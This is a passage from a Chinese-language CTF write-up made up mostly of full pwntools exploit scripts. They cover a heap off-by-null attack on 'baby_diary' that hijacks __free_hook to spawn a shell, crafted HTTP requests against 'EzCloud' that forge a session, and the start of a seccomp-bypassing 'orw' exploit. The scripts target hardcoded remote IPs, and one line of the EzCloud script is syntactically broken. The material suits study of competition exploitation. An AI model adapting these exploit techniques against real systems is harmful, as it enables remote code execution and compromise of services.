    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    debugg = 0
    logg = 0
    ctx.binary = './baby_diary'
    ctx.custom_lib_dir = './glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/'#remote libc
    ctx.debug_remote_libc = True
    ctx.symbols = {'note':0x4060,'size':0x4140}
    ctx.breakpoints = [0x15df]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")
    def lg(name,val):
        log.success("%s :%s"%(name,hex(val)))
    def getLeak():
        num = uu64(ru('\x7f',drop=False)[-6:])
        return num
    while 1:
        try:
            if debugg:
                rs()
            else:
                ctx.remote = ('8.140.114.72', 1399)
                rs(method = 'remote')
            if logg:
                context.log_level = 'debug'
            def choice(aid):
                sla('>> ',aid)
            def add(asize,acon):
                choice(1)
                sla('size: ',asize-1)
                sa('content: ',acon)
            def show(aid):
                choice(2)
                sla('index: ',aid)
            def free(aid):
                choice(3)
                sla('index: ',aid)
            for i in range(7):
                add(0x28,'chun_'+str(i)+'\n')#0-6
            '''
            heap_base = ctx.bases.heap
            lg("heap_base",heap_base)
            if (heap_base>>8)&0xf0 != 0xf0:
                ctx.close()
                continue
            if (heap_base>>16)&0xf != 0:
                ctx.close()
                continue
            raw_input('success!')
            '''
            add(0xc18,'padding\n')#7
            add(0x5e0,'8\n')#8
            add(0x18,'9\n')#9
            free(8)
            add(0x618,'8\n')#8
            add(0x28,chr(ord('a')-6)+'a'*7+p64(0x101)+p8(0x90)+'\n')#10
            add(0x28,'\n')#11
            add(0x28,'1'*7+'\n')#12
            add(0x28,'\n')#13
            add(0x28,'\n')#14
            for i in range(7):
                free(i)
            free(11)
            free(13)
            for i in range(7):
                add(0x28,'\n')#0-6
            add(0x618,'\n')#11
            add(0x28,chr(ord('b')-4)+'b'*7+p8(0x10)+'\n')#13
            add(0x20,'\x0d'+'\0'*0x1e)#15
            for i in range(7):
                free(i)
            free(14)
            free(10)
            for i in range(7):
                add(0x28,'\n')#0-6
            add(0x28,p8(0x10)+'\n')#10
            add(0x28,'\n')#14
            add(0x10,'\n')#16
            add(0x4d8,'\n')#17
            free(16)
            add(0x18,'\0'*0x17)#16 off by null
            free(16)
            add(0x18,p64(1)+p64(0)+'\n')#16 set data
            free(17)
            add(0x18,'\n')#17
            show(15)
            data = ru('diary')
            if '\x7f' not in data:
                ctx.close()
                continue
            libc = ctx.libc
            aid = data.find('\x7f')
            libc_base = uu64(data[aid-5:aid+1]) - 0x1ebbe0
            lg("libc_base",libc_base)
            free(13)
            free(12)
            free_hook = libc_base+libc.sym['__free_hook']
            system = libc_base+libc.sym['system']
            add(0x60,'\x00'*0x28+p64(0x31)+p64(free_hook-8)+'\n')#12
            add(0x28,'\n')#13
            add(0x28,'/bin/sh\0'+p64(system)+'\n')#18
            free(18)
            #ctx.debug()
            irt()
            if debugg == 1:
                break
        except KeyboardInterrupt:
            exit()
        except Exception,e:
            print e.message
###  0x03 EzCloud
当申请满16个chunk的时候，再次申请即可溢出修改到next session的指针。首先利用edit
note来改大点size，泄露堆地址，然后将伪造next session即可。
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from PwnContext import *
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    debugg = 0
    logg = 0
    ctx.binary = './EzCloud'
    ctx.custom_lib_dir = './glibc-all-in-one/libs/2.31-0ubuntu9.1_amd64/'#remote libc
    ctx.debug_remote_libc = True
    ctx.symbols = {'note':0xd1e0}
    ctx.breakpoints = [0x75f1]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")
    def lg(name,val):
        log.success("%s :%s"%(name,hex(val)))
    def getLeak():
        num = uu64(ru('\x7f',drop=False)[-6:])
        return num
    now_num = 8
    while 1:
        try:
            if debugg:
                rs()
            else:
                ctx.remote = ('47.94.234.66', 37128)
                rs(method = 'remote')
            if logg:
                context.log_level = 'debug'
            def login(aid):
                content = ''
                content += 'POST /login HTTP/1.1\r\n'
                content += 'Login-ID: {aid}\r\n'.format(aid=aid)
                content += 'Content-Length: 0\r\n'
                content += '\r\n'
                s(content)
                ru('\r\n')
            def add(aid,asize,acon):
                content = ''
                content += 'POST /notepad HTTP/1.1\r\n'
                content += 'Login-ID: {aid}\r\n'.format(aid=aid)
                content += 'Note-Operation: new%20note\r\n'
                content += 'Content-Length: {asize}\r\n'.format(asize=asize)
                content += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
                content += urlencode(acon)+'\r\n'
                content += '\r\n'
                s(content)
                ru('\r\n')
            def edit(lgid,aid,asize,acon):
                content = ''
                content += 'POST /notepad HTTP/1.1\r\n'
                content += 'Login-ID: {lgid}\r\n'.format(lgid=lgid)
                content += 'Note-Operation: edit%20note\r\n'
                content += 'Note-ID: {aid}\r\n'.format(aid=aid)
                content += 'Content-Length: {asize}\r\n'.format(asize=asize)
                content += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
                content += urlencode(acon)+'\r\n'
                content += '\r\n'
                s(content)
                ru('\r\n')
            def free(lgid,aid):
                content = ''
                content += 'POST /notepad HTTP/1.1\r\n'
                content += 'Login-ID: {lgid}\r\n'.format(lgid=lgid)
                content += 'Note-Operation: delete%20note\r\n'
                content += 'Note-ID: {aid}\r\n'.format(aid=aid)
                content += 'Content-Length: 0\r\n'
                content += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
                s(content)
                ru('\r\n')
            def show(aid):
                content = ''
                content += 'GET /notepad HTTP/1.1\r\n'
                content += 'Login-ID: {aid}\r\n'.format(aid=aid)
                content += 'Content-Length: 0\r\n'
                content += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
                s(content)
            def getflag(aid):
                content = ''
                content += 'GET /flag HTTP/1.1\r\n'
                content += 'Login-ID: {aid}\r\n'.format(aid=aid)
                content += 'Content-Length: 0\r\n'
                content += '\r\n'
                s(content)
            login('111')
            login('222')
            add('111',0x1,'A')
            edit('111',0,2,'B')
            show('111')
            ru('B')
            fake = (uu64(r(5)) \r\n')
            num = 0xe0
            for i in range(13):
                add('111',num*3,'A'*num)
            payload = ''
            payload += 'B'*0x30+p64(fake)
            payload += p64(1)+p64(fake+0x20)
            payload += p64(8)+p64(3)
            payload += '888'+'\0'*5
            payload += 'B'*(0xe0-len(payload))
            for i in range(16):
                add('222',num*3,payload)
            add('222',0x30,'C'*0x10)
            #ctx.debug()
            #raw_input()
            getflag('888')
            data = ru('\r\n')
            if '{' in data:
                print data
                irt()
            else:
                ctx.close()
            if debugg == 1:
                break
        except KeyboardInterrupt:
            exit()
        except Exception,e:
            print e.message
### 0x04 **orw**
seccomp沙箱，只允许read write open,覆盖free的got表为一块堆，然后在堆里填上jmp
rdi（要free的这块堆），利用另一块堆进行orw
注意还有一个漏洞，输入0的话可以无限输入，突破输入的限制：
​
exp:
    from pwn import *
    context.log_level="debug"
    context.os = 'linux'
    context.arch = 'amd64'
    elf = ELF('./pwn')
    #p = process('./pwn')
    p = remote('39.105.131.68',12354)
    libc = ELF('./libc-2.23.so')
    s       = lambda data               :p.send(str(data))    
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
    sl      = lambda data               :p.sendline(str(data)) 
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)